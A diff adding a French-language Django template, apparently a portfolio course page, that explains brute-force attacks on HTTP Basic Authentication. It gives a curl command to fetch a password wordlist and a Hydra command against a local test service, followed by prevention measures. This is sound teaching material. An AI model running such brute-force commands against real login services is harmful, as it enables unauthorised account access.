@@ -1,0 +1,116 @@
+{% load static %}
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Brute Force | Mohamed Mesli</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="{% static 'assets/css/bruteforce.css' %}">
+</head>
+
+<body>
+<main class="course-container">
+
+  <a href="{% url 'portfolio:accueil' %}" class="back-link">
+    ← Retour au portfolio
+  </a>
+
+  <h1>🔐 Login Brute Force (Basic Auth)</h1>
+
+  <section class="course-section">
+    <h2>🎯 Définition</h2>
+    <p>
+      Une attaque par <strong>brute-force</strong> consiste à tester un grand nombre
+      de combinaisons de mots de passe afin de compromettre un compte.
+      Dans le cas du <strong>Basic HTTP Authentication</strong>, cela revient
+      à tester automatiquement des credentials jusqu’à trouver le bon.
+    </p>
+  </section>
+
+  <section class="course-section">
+    <h2>⚠️ Impact</h2>
+    <ul>
+      <li>Accès non autorisé à des comptes</li>
+      <li>Compromission de données sensibles</li>
+      <li>Escalade de privilèges</li>
+    </ul>
+  </section>
+
+  <section class="course-section">
+    <h2>🧠 Pourquoi c’est vulnérable</h2>
+    <p>
+      Le <strong>Basic Auth</strong> envoie les identifiants encodés en Base64
+      dans chaque requête HTTP. Sans protection supplémentaire (rate limiting,
+      captcha, etc.), il devient très facile de lancer une attaque brute-force.
+    </p>
+  </section>
+
+  <section class="course-section">
+    <h2>🔍 Fonctionnement du Basic Auth</h2>
+    <ul>
+      <li>Le serveur répond avec <code>401 Unauthorized</code></li>
+      <li>Le navigateur demande un login/mot de passe</li>
+      <li>Les credentials sont encodés en Base64</li>
+      <li>Envoyés dans le header <code>Authorization</code></li>
+    </ul>
+
+    <pre><code>Authorization: Basic YWxpY2U6c2VjcmV0MTIz</code></pre>
+  </section>
+
+  <section class="course-section">
+    <h2>🛠️ Outil : Hydra</h2>
+    <p>
+      <strong>Hydra</strong> est un outil permettant d’automatiser les attaques
+      brute-force sur différents services (HTTP, SSH, FTP, etc.).
+    </p>
+  </section>
+
+  <section class="course-section">
+    <h2>🚀 Exploitation avec Hydra</h2>
+
+    <h3>1. Télécharger une wordlist</h3>
+    <pre><code>curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/.../2023-200_most_used_passwords.txt</code></pre>
+
+    <h3>2. Lancer l’attaque</h3>
+    <pre><code>hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81</code></pre>
+
+    <h3>3. Explication</h3>
+    <ul>
+      <li><code>-l</code> : username connu</li>
+      <li><code>-P</code> : liste de mots de passe</li>
+      <li><code>127.0.0.1</code> : cible</li>
+      <li><code>http-get /</code> : attaque via HTTP GET</li>
+      <li><code>-s 81</code> : port</li>
+    </ul>
+  </section>
+
+  <section class="course-section">
+    <h2>🧪 Résultat</h2>
+    <pre><code>[http-get] host: 127.0.0.1   login: basic-auth-user   password: ******</code></pre>
+
+    <p>
+      ✅ Hydra trouve automatiquement le bon mot de passe en testant
+      toute la wordlist.
+    </p>
+  </section>
+
+  <section class="course-section">
+    <h2>🛡️ Prévention</h2>
+    <ul>
+      <li>Limiter le nombre de tentatives (rate limiting)</li>
+      <li>Utiliser un CAPTCHA</li>
+      <li>Activer l’authentification multi-facteurs (MFA)</li>
+      <li>Utiliser HTTPS</li>
+      <li>Logs et détection d’anomalies</li>
+    </ul>
+  </section>
+
+  <div class="course-disclaimer">
+    ⚠️ Ce contenu est strictement pédagogique.
+    Toute utilisation doit être faite dans un cadre légal et autorisé.
+  </div>
+
+</main>
+</body>
+</html>
